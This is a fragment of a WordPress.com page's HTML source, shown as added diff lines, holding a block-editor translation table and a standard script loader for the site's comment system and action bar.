keyword\u0004wrapper":[],"block keyword\u0004container":[],"block keyword\u0004images":[],"block keyword\u0004download":[],"block keyword\u0004document":[],"block keyword\u0004archive":[],"block keyword\u0004posts":[],"block style label\u0004Outline":[],"block style label\u0004Fill":[],"block keyword\u0004podcast":[],"block keyword\u0004sound":[],"block keyword\u0004music":[],"Letter spacing":[],"Points (pt)":[],"Picas (pc)":[],"Inches (in)":[],"Millimeters (mm)":[],"Centimeters (cm)":[],"x-height of the font (ex)":[],"Width of the zero (0) character (ch)":[],"Viewport largest dimension (vmax)":[],"Viewport smallest dimension (vmin)":[],"Percent (%)":[],"Margin":[],"Apply duotone filter":[],"Duotone":[],"Highlights":[],"Shadows":[],"Duotone: %s":[],"Duotone code: %s":[],"Patterns list":[],"Use left and right arrow keys to move through blocks":[],"Customize the width for all elements that are assigned to the center or wide columns.":[],"Wide":[],"Layout":[],"Dotted":[],"Dashed":[],"Widget types":[],"Add citation":[],"Add caption":[],"Type / to choose a block":[],"Relative to root font size (rem)\u0004rems":[],"Relative to parent font size (em)\u0004ems":[],"Border color":[],"Border width":[],"Border":[],"Grid":[],"Area":[],"Search for blocks and patterns":[],"label for previous post link\u0004Previous":[],"label for next post link\u0004Next":[],"Indent":[],"Outdent":[],"Ordered":[],"Unordered":[],"Space between items":[],"Add text over image":[],"Drag":[],"Add an anchor":[],"Align":[],"block title\u0004Video":[],"block title\u0004Spacer":[],"block title\u0004Separator":[],"block title\u0004Group":[],"block title\u0004Search":[],"block title\u0004More":[],"block title\u0004Unsupported":[],"block title\u0004List":[],"block title\u0004Navigation":[],"block title\u0004File":[],"block title\u0004Cover":[],"block title\u0004Column":[],"block title\u0004Columns":[],"block title\u0004Code":[],"block title\u0004Buttons":[],"block title\u0004Button":[],"block title\u0004Audio":[],"block title\u0004Gallery":[],"block title\u0004Quote":[],"block title\u0004Heading":[],"block title\u0004Image":[],"block title\u0004Paragraph":[],"Editor canvas":[],"Select unit":[],"text direction\u0004ltr":[],"Block vertical alignment setting\u0004Align bottom":[],"Block vertical alignment setting\u0004Align middle":[],"Block vertical alignment setting\u0004Align top":[],"Capitalize":[],"Lowercase":[],"Uppercase":[],"List text":[],"Vertical":[],"Horizontal":[],"Image caption text":[],"Font weight":[],"Font style":[],"%1$s %2$s":[],"Themes":[],"Keyword":[],"Filters":[],"Viewport height (vh)":[],"Viewport width (vw)":[],"Relative to root font size (rem)":[],"Relative to parent font size (em)":[],"Pixels (px)":[],"Percentage (%)":[],"Keyboard input":[],"Letter case":[],"Decoration":[],"Close search":[],"Only":[],"Exclude":[],"Include":[],"Loading …":[],"Appearance":[],"Kind":[],"Label":[],"Captions":[],"link color":[],"Radial":[],"Linear":[],"Create: <mark>%s</mark>":[],"Search for patterns":[],"Anonymous":[],"Characters":[],"Block pattern \"%s\" inserted.":[],"Description":[],"Base":[],"Author":[],"Media preview":[],"Image uploaded.":[],"Could not edit image. %s":[],"Original":[],"Move the selected block(s) down.":[],"Move the selected block(s) up.":[],"Move to":[],"Browse all":[],"Browse all. This will open the main inserter panel in the editor toolbar.":[],"Use the Tab key and Arrow keys to choose new block location. Use Left and Right Arrow keys to move between nesting levels. Once location is selected press Enter or Space to move the block.":[],"Reset search":[],"Name":[],"Crop":[],"Rotate":[],"Zoom":[],"2:3":[],"3:4":[],"9:16":[],"Portrait":[],"3:2":[],"4:3":[],"16:9":[],"Landscape":[],"Aspect Ratio":[],"Box Control":[],"Mixed":[],"Right":[],"Left":[],"Bottom":[],"Top":[],"A tip for using the block editor":[],"%d block added.":[],"You are currently in navigation mode. Navigate blocks using the Tab key and Arrow keys. Use Left and Right Arrow keys to move between nesting levels. To exit navigation mode and edit the selected block, press Enter.":[],"Spacing":[],"Padding":[],"Block name":[],"Design":[],"Text":[],"Widget areas":["Vimpainalueet"],"Moved %d block to clipboard.":["%d lohkoa siirretty leikepöydälle."],"Copied %d block to clipboard.":["%d lohkoa kopioitu leikepöydälle."],"Moved \"%s\" to clipboard.":["\"%s\" siirretty leikepöydälle."],"Copied \"%s\" to clipboard.":["\"%s\" kopioitu leikepöydälle."],"Block navigation structure":["Lohkonavigoinnin rakenne"],"Block %1$d of %2$d, Level %3$d.":[],"Notifications":["Ilmoitukset"],"Offset":[],"Pages":[],"Uncategorized":[],"Search results":[],"White":[],"Black":[],"Superscript":[],"Subscript":[],"Patterns":[],"patterns\u0004All":[],"%1$s Block. Row %2$d":[],"Typography":[],"Line height":[],"Content":[],"Menu Location":[],"Menu":[],"Home":[],"Current media URL:":[],"Move %1$s block from position %2$d left to position %3$d":[],"Move %1$s block from position %2$d down to position %3$d":[],"User":[],"Post Type":[],"Site":[],"Block patterns":[],"Type":[],"Block %1$s is at the beginning of the content and can’t be moved left":[],"Block %1$s is at the beginning of the content and can’t be moved up":[],"Block %1$s is at the end of the content and can’t be moved left":[],"Block %1$s is at the end of the content and can’t be moved down":[],"Creating":[],"An unknown error occurred during creation. Please try again.":[],"Change a block's type by pressing the block icon on the toolbar.":[],"Drag files into the editor to automatically insert media blocks.":[],"Outdent a list by pressing <kbd>backspace</kbd> at the beginning of a line.":[],"Indent a list by pressing <kbd>space</kbd> at the beginning of a line.":[],"Solid":[],"Mobile":[],"block keyword\u0004links":[],"text color":[],"Embed a TikTok video.":[],"survey":[],"social":[],"Global Styles":[],"Angle":[],"%s Block":[],"%1$s Block. %2$s":[],"%1$s Block. Column %2$d":[],"%1$s Block. Column %2$d. %3$s":[],"%1$s Block. Row %2$d. %3$s":[],"Choose":[],"Theme":[],"Empty":[],"Search results for \"%s\"":[],"Multiple selected blocks":[],"Show:":[],"Buttons":[],"Background":[],"Image size":[],"Help":[],"Untitled":[],"Next":[],"Previous":[],"Finish":[],"Remove Control Point":[],"Use your left or right arrow keys or drag and drop with the mouse to change the gradient position. Press the button to change the color or remove the control point.":[],"Gradient control point at position %1$s%% with color code %2$s.":[],"Open Media Library":[],"The media file has been replaced":[],"Replace":[],"You are currently in edit mode. To return to the navigation mode, press Escape.":[],"You are probably offline.":[],"Justify items right":[],"Justify items center":[],"Justify items left":[],"Change items justification":[],"inserter":[],"podcast":[],"Menu Item":[],"Navigation":[],"(Note: many devices and browsers do not display this text.)":[],"Describe the role of this image on the page.":[],"Currently selected":[],"Search or type url":[],"Press ENTER to add this link":[],"Currently selected link settings":[],"Generic label for block inserter button\u0004Add block":[],"directly add the only allowed block\u0004Add %s":[],"%s block added":[],"Extra Large":[],"Template":[],"Gradient: %s":[],"Gradient code: %s":[],"Media upload failed. If this is a photo or a large image, please scale it down and try again.":[],"Gradient":[],"Midnight":[],"Electric grass":[],"Pale ocean":[],"Luminous dusk":[],"Blush bordeaux":[],"Blush light purple":[],"Cool to warm spectrum":[],"Very light gray to cyan bluish gray":[],"Luminous vivid orange to vivid red":[],"Luminous vivid amber to luminous vivid orange":[],"Light green cyan to vivid green cyan":[],"Vivid cyan blue to vivid purple":[],"Version":[],"Dimensions":[],"In quoting others, we cite ourselves.":[],"Mont Blanc appears—still, snowy, and serene.":[],"In a village of La Mancha, the name of which I have no desire to call to mind, there lived not long since one of those gentlemen that keep a lance in the lance-rack, an old buckler, a lean hack, and a greyhound for coursing.":[],"Templates":[],"Add":[],"Fill":[],"Link rel":[],"Border radius":[],"Reverse list numbering":[],"Start value":[],"While writing, you can press <kbd>/</kbd> to quickly insert new blocks.":[],"Color":[],"Vivid purple":[],"Custom":[],"Draft":[],"Learn more about anchors":[],"Enter a word or two — without spaces — to make a unique web address just for this block, called an “anchor”. Then, you’ll be able to link directly to this section of your page.":[],"Upload a video file, pick one from your media library, or add one with a URL.":[],"Upload an image file, pick one from your media library, or add one with a URL.":[],"Upload an audio file, pick one from your media library, or add one with a URL.":[],"Upload a media file or pick one from your media library.":[],"Skip":[],"Title attribute":[],"Open in new tab":[],"Move right":[],"Move left":[],"Links":[],"menu":[],"Learn more about embeds":[],"Paste a link to the content you want to display on your site.":[],"Ungrouping blocks from within a grouping block back into individual blocks within the Editor \u0004Ungroup":[],"verb\u0004Group":[],"Separate multiple classes with spaces.":[],"Inline code":[],"This color combination may be hard for people to read.":[],"Group":[],"Describe the purpose of the image.":[],"Add a block":[],"Block vertical alignment setting label\u0004Change vertical alignment":[],"Change block type or style":[],"Embedded content from %s can't be previewed in the editor.":[],"block style\u0004Default":[],"Back":[],"Taxonomy":[],"Default":[],"Search":[],"Sorry, this content could not be embedded.":[],"Embed Amazon Kindle content.":[],"ebook":[],"Embed Crowdsignal (formerly Polldaddy) content.":[],"Underline":[],"Attempt Block Recovery":[],"Word count type. Do not translate!\u0004words":[],"button label\u0004Convert to link":[],"button label\u0004Try again":[],"Link CSS class":[],"To edit this block, you need permission to upload media.":[],"Block tools":[],"This image has an empty alt attribute":[],"This image has an empty alt attribute; its file name is %s":[],"Link inserted.":[],"Warning: the link has been inserted but may have errors. Please test it.":[],"%s block selected.":[],"Thumbnail":[],"Full Size":[],"Link selected.":[],"Align text right":[],"Align text center":[],"Align text left":[],"Empty block; start writing or type forward slash to choose a block":[],"Annotation":[],"blocks\u0004Most used":[],"imperative verb\u0004Resolve":[],"font size name\u0004Huge":[],"font size name\u0004Large":[],"font size name\u0004Medium":[],"font size name\u0004Small":[],"font size name\u0004Normal":[],"button label\u0004Embed":[],"block title\u0004Embed":[],"block title\u0004Classic":[],"Link edited.":[],"Link removed.":[],"media":[],"Media":[],"Navigate to the nearest toolbar.":[],"Resize for smaller devices":[],"This embed may not preserve its aspect ratio when the browser is resized.":[],"This embed will preserve its aspect ratio when the browser is resized.":[],"Embed an Animoto video.":[],"Embed a Vimeo video.":[],"Embed Flickr content.":[],"Embed Spotify content.":[],"Embed SoundCloud content.":[],"Embed a WordPress post.":[],"Embed an Instagram post.":[],"Embed a Facebook post.":[],"Embed a WordPress.tv video.":[],"Embed a VideoPress video.":[],"Embed a Tumblr post.":[],"Embed a TED video.":[],"Embed Speaker Deck content.":[],"Embed a YouTube video.":[],"Embed SmugMug content.":[],"Embed Slideshare content.":[],"Embed Scribd content.":[],"Embed Screencast content.":[],"Embed ReverbNation content.":[],"Embed a Reddit thread.":[],"Embed Mixcloud content.":[],"Embed a tweet.":[],"Embed Kickstarter content.":[],"Embed Issuu content.":[],"Embed Imgur content.":[],"Embed a Dailymotion video.":[],"Embed CollegeHumor content.":[],"Embed Cloudup content.":[],"noun\u0004View":[],"editor button\u0004Left to right":[],"Paste or type URL":[],"Insert from URL":[],"Styles":[],"Options":[],"(opens in a new tab)":[],"Time":[],"May":[],"Date":[],"Cover":[],"Huge":[],"Medium":[],"Normal":[],"Paste URL or type to search":[],"Terms":[],"This block contains unexpected or invalid content.":[],"Resolve Block":[],"Convert to HTML":[],"View":[],"HTML":[],"Media settings":[],"Overlay":[],"Backtick":[],"Period":[],"Comma":[],"Change type of %d block":[],"Current":[],"After Conversion":[],"Change alignment":[],"Change text alignment":[],"%d block":[],"Title":[],"Convert to Classic Block":[],"Create":[],"Move %1$d blocks from position %2$d right by one place":[],"Move %1$d blocks from position %2$d up by one place":[],"Move %1$s block from position %2$d right to position %3$d":[],"Move %1$s block from position %2$d up to position %3$d":[],"Insert a new block before the selected block(s).":[],"Remove the selected block(s).":[],"Duplicate the selected block(s).":[],"Clear selection.":[],"Select all text when typing. Press again to select all blocks.":[],"Insert a new block after the selected block(s).":[],"Learn more":[],"XL":[],"L":[],"M":[],"S":[],"Small":[],"Edit URL":[],"The response is not a valid JSON response.":[],"Auto":[],"Preload":[],"Support":[],"Cyan bluish gray":[],"Vivid cyan blue":[],"Pale cyan blue":[],"Vivid green cyan":[],"Light green cyan":[],"Luminous vivid amber":[],"Luminous vivid orange":[],"Vivid red":[],"Pale pink":[],"Inline image":[],"Transform to":[],"Large":[],"Link to":[],"File":[],"Column":[],"Square":[],"Loop":[],"Autosaving":[],"block description\u0004Add a block that displays content pulled from other sites, like Twitter or YouTube.":[],"No results found.":[],"Toggle to show a large initial letter.":[],"Showing large initial letter.":[],"Color code: %s":[],"OK":[],"Link settings":[],"Unlink":[],"Pagination":[],"Next page":[],"Height":[],"Width":[],"Media Library":[],"Advanced":[],"Scheduled":[],"Plugins":[],"Custom Size":[],"term\u0004%s removed":[],"imperative verb\u0004Preview":[],"Words":[],"Private":[],"Term":[],"Tag":[],"Saving":[],"Visibility:":[],"Schedule":[],"Update":[],"Copy":[],"Suggestion:":[],"Status":[],"Standard":[],"no title":[],"Order":[],"%d result found.":[],"Saved":[],"Embeds":[],"Blocks":[],"Add block":[],"Undo":[],"Redo":[],"More options":[],"Edit visually":[],"Duplicate":[],"Blocks cannot be moved down as they are already at the bottom":[],"Blocks cannot be moved up as they are already at the top":[],"Block %1$s is at the beginning of the content and can’t be moved right":[],"Block %1$s is at the end of the content and can’t be moved right":[],"Block %s is the only block, and cannot be moved":[],"Move down":[],"Move up":[],"Edit as HTML":[],"Convert to Blocks":[],"Block: %s":[],"This block has encountered an error and cannot be previewed.":[],"Remove":[],"Copied!":[],"Visibility":[],"Block":[],"Document":[],"Tools":[],"Editor":[],"Settings":[],"Reset":[],"Off":[],"Drop files to upload":[],"PM":[],"AM":[],"An unknown error occurred.":[],"No results.":[],"%d result found, use up and down arrow keys to navigate.":[],"URL":[],"Submit":[],"Close":[],"Edit link":[],"Link":[],"Strikethrough":[],"Italic":[],"Bold":[],"Remove link":[],"Category":[],"Select":[],"Video":[],"Separator":[],"Quote":[],"Paragraph":[],"Font size":[],"Drop cap":[],"Read more":[],"Indent list item":[],"Outdent list item":[],"Convert to ordered list":[],"Convert to unordered list":[],"List":[],"photo":[],"Size":[],"Image":[],"Preview":[],"Heading":[],"None":[],"Gallery":[],"More":[],"Classic":[],"video":[],"audio":[],"music":[],"image":[],"blog":[],"post":[],"Embedded content from %s":[],"Enter URL to embed here…":[],"%s URL":[],"Text alignment":[],"Edit image":[],"Columns":[],"Code":[],"Categories":[],"Button":[],"Apply":[],"Reusable blocks":[],"Cancel":[],"Edit":[],"Audio":[],"Upload":[],"Additional CSS class(es)":[],"HTML anchor":[],"This color combination may be hard for people to read. Try using a brighter background color and/or a darker %s.":[],"This color combination may be hard for people to read. Try using a darker background color and/or a brighter %s.":[],"Clear":[],"Custom color picker.":[],"Color: %s":[],"Full width":[],"Wide width":[],"Widgets":[],"Align right":[],"Align center":[],"Align left":[],"https://github.com/WordPress/gutenberg":[],"Gutenberg":[],"Authors":[],"Slug":[],"Comment":[],"Publish":[],"Metadata":[],"Save":[],"Revisions":[]}}} );
+</script>
+
+<script>
+(function() {
+	'use strict';
+
+	const fetches = {};
+	const promises = {};
+	const urls = {
+		'verbum': 'https://s0.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/moon/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.js?m=1718212087i&minify=false&ver=f722f8e738413ba13e41'
+	};
+	const loaders = {
+		'verbum': () => {
+			fetchExternalScript('verbum');
+			promises['verbum'] = promises['verbum'] || loadWPScript('verbum');
+			return promises['verbum'];
+		},
+		
+	};
+	const scriptExtras = {
+		'verbum': { translations: 1, before: 0, after: 0 },
+		
+	};
+
+	window.WP_Enqueue_Dynamic_Script = {
+		loadScript: (handle) => {
+			if (!loaders[handle]) {
+				console.error('WP_Enqueue_Dynamic_Script: unregistered script `' + handle + '`.');
+			}
+			return loaders[handle]();
+		}
+	};
+
+	function fetchExternalScript(handle) {
+		if (!urls[handle]) {
+			return Promise.resolve();
+		}
+
+		fetches[handle] = fetches[handle] || fetch(urls[handle], { mode: 'no-cors' });
+		return fetches[handle];
+	}
+
+	function runExtraScript(handle, type, index) {
+		const id = 'wp-enqueue-dynamic-script:' + handle + ':' + type + ':' + (index + 1);
+		const template = document.getElementById(id);
+		if (!template) {
+			return Promise.reject();
+		}
+
+		const script = document.createElement( 'script' );
+		script.innerHTML = template.innerHTML;
+		document.body.appendChild( script );
+		return Promise.resolve();
+	}
+
+	function loadExternalScript(handle) {
+		if (!urls[handle]) {
+			return Promise.resolve();
+		}
+
+		return fetches[handle].then(() => {
+			return new Promise((resolve, reject) => {
+				const script = document.createElement('script');
+				script.onload = () => resolve();
+				script.onerror = (e) => reject(e);
+				script.src = urls[handle];
+				document.body.appendChild(script);
+			});
+		});
+	}
+
+	function loadExtra(handle, pos) {
+		const count = (scriptExtras[handle] && scriptExtras[handle][pos]) || 0;
+		let promise = Promise.resolve();
+
+		for (let i = 0; i < count; i++) {
+			promise = promise.then(() => runExtraScript(handle, pos, i));
+		}
+
+		return promise;
+	}
+
+	function loadWPScript(handle) {
+		// Core loads scripts in this order. See: https://github.com/WordPress/WordPress/blob/a59eb9d39c4fcba834b70c9e8dfd64feeec10ba6/wp-includes/class-wp-scripts.php#L428.
+		return loadExtra(handle, 'translations')
+			.then(() => loadExtra(handle, 'before'))
+			.then(() => loadExternalScript(handle))
+			.then(() => loadExtra(handle, 'after'));
+	}
+} )();
+</script>
+
+
+
+<div class="comment-likes-overlay" style="display: none;"></div><script src="https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.js?v=20231122" defer=""></script></body></html>
